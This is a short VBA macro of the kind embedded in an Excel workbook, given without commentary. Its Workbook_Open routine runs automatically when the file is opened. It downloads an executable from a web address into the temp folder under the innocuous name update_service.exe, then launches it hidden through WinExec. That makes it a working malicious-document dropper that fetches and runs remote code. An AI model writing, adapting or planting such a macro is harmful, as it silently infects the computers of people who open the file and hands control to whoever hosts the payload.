Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" ( _
    ByVal pCaller As LongPtr, _
    ByVal szURL As String, _
    ByVal szFileName As String, _
    ByVal dwReserved As Long, _
    ByVal lpfnCB As LongPtr) As Long

Private Declare PtrSafe Function WinExec Lib "kernel32" ( _
    ByVal lpCmdLine As String, _
    ByVal nCmdShow As Long) As Long

Sub Workbook_Open()
    Dim url As String
    Dim savePath As String
    Dim result As Long

    url = "<URL>" & Timer
    savePath = Environ("TEMP") & "\update_service.exe"
    result = URLDownloadToFile(0, url, savePath, 0, 0)
    
    If result = 0 Then
        WinExec savePath, 0
    End If
End Sub